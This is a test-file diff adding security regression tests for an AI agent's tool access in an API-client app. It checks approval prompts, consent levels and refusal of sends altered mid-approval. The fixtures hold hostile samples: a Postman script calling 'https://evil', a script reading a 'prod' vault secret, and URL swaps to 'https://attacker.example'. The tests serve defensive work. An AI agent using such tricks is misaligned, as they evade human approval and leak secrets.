@@ -630,6 +630,7 @@ describe('execute tools', () => {
       'GET https://user:pw@api.example.com/orders',
       'Collection “Orders”',
       'Environment “staging”',
+      'No scripts',
     ]);
 
     const data = ok<{
@@ -672,5 +673,167 @@ describe('execute tools', () => {
     );
     expect(data.summary.passed).toBe(1);
     expect(data.requests[0]?.requestId).toBe('req-list');
+  });
+});
+
+describe('security audit regressions', () => {
+  it('a script from the agent always asks — even in auto-approve mode — and shows the code', async () => {
+    grant((c) => setCollectionConsent(c, ORDERS.id, 'edit'));
+    setSettings({ approvalMode: 'auto-approve-edits' });
+    const script = "rs.test(await rs.vault.get('prod'), () => {});";
+    const pending = runControlTool(
+      call('update_request', { requestId: 'req-list', patch: { testScript: script } })
+    );
+    const card = await answerApproval('denied');
+    expect(card.details.join('\n')).toContain(script);
+    expect((await pending).ok).toBe(false);
+
+    // Plain edits still apply silently in this mode.
+    ok(await runControlTool(call('rename_item', { itemId: 'req-list', name: 'Orders list' })));
+  });
+
+  it('create_request with a script and import_collection with scripts always ask', async () => {
+    grant((c) => setCollectionConsent(c, ORDERS.id, 'edit'));
+    setSettings({ approvalMode: 'auto-approve-edits' });
+    const pending = runControlTool(
+      call('create_request', {
+        collectionId: ORDERS.id,
+        request: { type: 'http', name: 'S', url: 'u', preRequestScript: 'console.log(1)' },
+      })
+    );
+    const card = await answerApproval('approved');
+    expect(card.details.some((d) => d.includes('console.log(1)'))).toBe(true);
+    ok(await pending);
+
+    const postman = JSON.stringify({
+      info: {
+        name: 'P',
+        schema: 'https://schema.getpostman.com/json/collection/v2.1.0/collection.json',
+      },
+      item: [
+        {
+          name: 'r',
+          request: { method: 'GET', url: 'https://x.example' },
+          event: [{ listen: 'test', script: { exec: ['pm.sendRequest("https://evil")'] } }],
+        },
+      ],
+    });
+    const importing = runControlTool(
+      call('import_collection', { format: 'postman', content: postman })
+    );
+    const importCard = await answerApproval('denied');
+    expect(importCard.details.join('\n')).toContain('evil');
+    expect((await importing).ok).toBe(false);
+  });
+
+  it('refuses an approved send when the request changed while the card was open', async () => {
+    grant((c) => setCollectionConsent(c, ORDERS.id, 'full'));
+    setSettings({ approvalMode: 'auto-approve-edits' });
+    const pending = runControlTool(call('send_request', { requestId: 'req-list' }));
+    await vi.waitFor(() => expect(useMcpServerRuntimeStore.getState().approvals).toHaveLength(1));
+    // A second agent call swaps the URL while the user is reading the card.
+    ok(
+      await runControlTool(
+        call('update_request', {
+          requestId: 'req-list',
+          patch: { url: 'https://attacker.example' },
+        })
+      )
+    );
+    await answerApproval('approved');
+    const r = await pending;
+    expect(r.ok).toBe(false);
+    expect(!r.ok && r.error).toMatch(/modified while it waited for approval/);
+    expect(runner.runCollection).not.toHaveBeenCalled();
+  });
+
+  it('refuses an approved send when an environment variable changed meanwhile', async () => {
+    grant((c) =>
+      setEnvironmentExecutable(
+        setEnvironmentConsent(setCollectionConsent(c, ORDERS.id, 'full'), STAGING.id, 'edit'),
+        STAGING.id,
+        true
+      )
+    );
+    setSettings({ approvalMode: 'auto-approve-edits' });
+    const pending = runControlTool(
+      call('send_request', { requestId: 'req-list', environmentId: STAGING.id })
+    );
+    await vi.waitFor(() => expect(useMcpServerRuntimeStore.getState().approvals).toHaveLength(1));
+    ok(
+      await runControlTool(
+        call('set_environment_variable', {
+          environmentId: STAGING.id,
+          key: 'baseUrl',
+          value: 'https://attacker.example',
+        })
+      )
+    );
+    await answerApproval('approved');
+    expect((await pending).ok).toBe(false);
+    expect(runner.runCollection).not.toHaveBeenCalled();
+  });
+
+  it('update cards show the new values', async () => {
+    grant((c) => setCollectionConsent(c, ORDERS.id, 'edit'));
+    const pending = runControlTool(
+      call('update_request', { requestId: 'req-list', patch: { url: 'https://new.example/x' } })
+    );
+    const card = await answerApproval('denied');
+    expect(card.details).toContain('url → https://new.example/x');
+    await pending;
+  });
+
+  it('the send card shows the resolved URL and the scripts that will run', async () => {
+    useCollectionStore.getState().updateCollectionItem(ORDERS.id, 'req-list', {
+      request: {
+        ...(ORDERS.items[0]!.items![0]!.request as object),
+        url: '{{baseUrl}}/orders',
+        testScript: 'rs.test("x", () => {})',
+      } as never,
+    });
+    grant((c) =>
+      setEnvironmentExecutable(
+        setEnvironmentConsent(setCollectionConsent(c, ORDERS.id, 'full'), STAGING.id, 'read-only'),
+        STAGING.id,
+        true
+      )
+    );
+    const pending = runControlTool(
+      call('send_request', { requestId: 'req-list', environmentId: STAGING.id })
+    );
+    const card = await answerApproval('denied');
+    expect(card.details).toContain('Resolves to: GET https://staging.example.com/orders');
+    expect(card.details).toContain('Runs scripts: request test');
+    await pending;
+  });
+
+  it('a sub-environment needs its parent opted in for sending', async () => {
+    useEnvironmentStore.setState({
+      environments: [
+        structuredClone(STAGING),
+        { id: 'env-sub', name: 'staging-eu', parentId: STAGING.id, variables: [] },
+      ],
+      activeEnvironmentId: null,
+    });
+    grant((c) =>
+      setEnvironmentExecutable(
+        setEnvironmentConsent(setCollectionConsent(c, ORDERS.id, 'full'), 'env-sub', 'read-only'),
+        'env-sub',
+        true
+      )
+    );
+    const r = await runControlTool(
+      call('send_request', { requestId: 'req-list', environmentId: 'env-sub' })
+    );
+    expect(!r.ok && r.error).toMatch(/parent environment/);
+  });
+
+  it('switching the active environment needs edit access', async () => {
+    grant((c) => setEnvironmentConsent(c, STAGING.id, 'read-only'));
+    setSettings({ approvalMode: 'auto-approve-edits' });
+    const r = await runControlTool(call('set_active_environment', { environmentId: STAGING.id }));
+    expect(r.ok).toBe(false);
+    expect(useEnvironmentStore.getState().activeEnvironmentId).toBeNull();
   });
 });
